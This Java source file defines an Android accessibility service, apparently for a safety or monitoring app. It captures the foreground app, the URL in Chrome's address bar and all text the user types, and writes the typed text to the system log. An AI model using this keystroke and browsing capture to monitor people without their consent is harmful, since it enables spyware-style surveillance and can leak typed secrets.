package hu.awesometeam.keyper;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;
import java.util.Objects;

public class SafetyService extends AccessibilityService {
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        ///TODO init
        Log.i("AccService", "onServiceConnected");
    }


    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
                event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            ///send event package
            SafetyEventHandler.getInstance(getApplicationContext())
                    .packageEvent(event.getPackageName().toString(), getApplicationContext());

            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                SafetyEventHandler.getInstance(getApplicationContext())
                        .urlUpdatedEvent(getCurrentUrl(rootNode), getApplicationContext());
            }
        }
        if(event.getEventType()== AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED){
            SafetyEventHandler.getInstance(getApplicationContext())
                    .textUpdatedEvent(event.getText().toString(), getApplicationContext());
            Log.d("AccService", "TypedText: "+event.getText().toString());
        }

    }

    @Override
    public void onInterrupt() {
        Log.i("AccService", "Interrupted");
        // Handle accessibility interruption if needed
    }

    private String getCurrentUrl(AccessibilityNodeInfo rootNode) {
        AccessibilityNodeInfo addressBarNode = findAddressBarNode(rootNode);
        if (addressBarNode != null && addressBarNode.getText() != null) {
            return addressBarNode.getText().toString();
        }
        return "";
    }
    private AccessibilityNodeInfo findAddressBarNode(AccessibilityNodeInfo rootNode) {
        if (rootNode == null) {
            return null;
        }
        List<AccessibilityNodeInfo> addressBars = null;
        if (rootNode.getPackageName() == null) {
            return null;
        }
        if(Objects.equals((String) rootNode.getPackageName(), "com.android.chrome")){
            ///TODO find on seperate thread maybe
            addressBars = rootNode.findAccessibilityNodeInfosByViewId("com.android.chrome:id/url_bar");
        }
        if (addressBars == null || addressBars.isEmpty()) {
            return null;
        }
        return addressBars.get(0);
    }
    public static void logViewHierarchy(AccessibilityNodeInfo nodeInfo, final int depth) {

        if (nodeInfo == null) return;

        String spacerString = "";

        for (int i = 0; i < depth; ++i) {
            spacerString += '-';
        }
        //Log the info you care about here... I choce classname and view resource name, because they are simple, but interesting.
        if(nodeInfo.getClassName().equals("android.widget.EditText")) {
            Log.d("TAG", spacerString + nodeInfo.getClassName() + " " + nodeInfo.getViewIdResourceName());
            Log.d("TAG", " " +spacerString + nodeInfo.getClassName() +nodeInfo.getText());
            Log.d("TAG", " " +spacerString + nodeInfo.getClassName() +nodeInfo.findFocus(AccessibilityNodeInfo.FOCUS_INPUT));


        }
        for (int i = 0; i < nodeInfo.getChildCount(); ++i) {
            logViewHierarchy(nodeInfo.getChild(i), depth+1);
        }
    }



}

